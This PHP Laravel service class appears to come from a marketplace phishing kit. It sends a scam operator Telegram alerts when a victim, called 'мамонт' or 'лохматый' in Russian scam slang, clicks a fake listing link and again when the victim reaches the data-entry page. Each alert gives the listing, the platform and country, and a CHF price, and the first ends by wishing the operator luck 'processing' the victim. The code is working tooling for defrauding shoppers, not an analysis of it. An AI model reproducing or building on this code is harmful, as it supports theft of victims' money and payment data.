<?php

namespace App\Services;

use Telegram\Bot\Laravel\Facades\Telegram;

class TelegramService
{
    public static function sendIndexLink($chatId, $link, $service, $action)
    {
        $message ="😱Мамонт перешёл по твоей ссылке!

📊Объявление: $link->id
💲Площадка: $service->name [$service->country]
💰Стоимость товарки: $link->price CHF
🏬Товарка: $link->name

⚡️Желаю успеха в обработке лохматого!";
        if($action == 'receive') {
            $message = "😎Лохматый перешёл на ввод данных!

📊Объявление: $link->id
💲Площадка: $service->name [$service->country]
💰Стоимость товарки: $link->price CHF
🏬Товарка: $link->name";
            }
        $keyboard = [

                [
                    ['text' => 'Проверить онлайн', 'callback' => "check_online"],
                    ['text' => '💲Smartsupp', 'url' => "https://www.smartsupp.com/"],
                ],

        ];
        $kb = Telegram::Inline ([
            'inline_keyboard' => $keyboard,
            'resize_keyboard' => true,
            'one_time_keyboard' => true
        ]);
        Telegram::sendMessage([
            'chat_id' => $chatId,
            'text' => $message,
            'reply_markup' => $kb
        ]);
    }
}
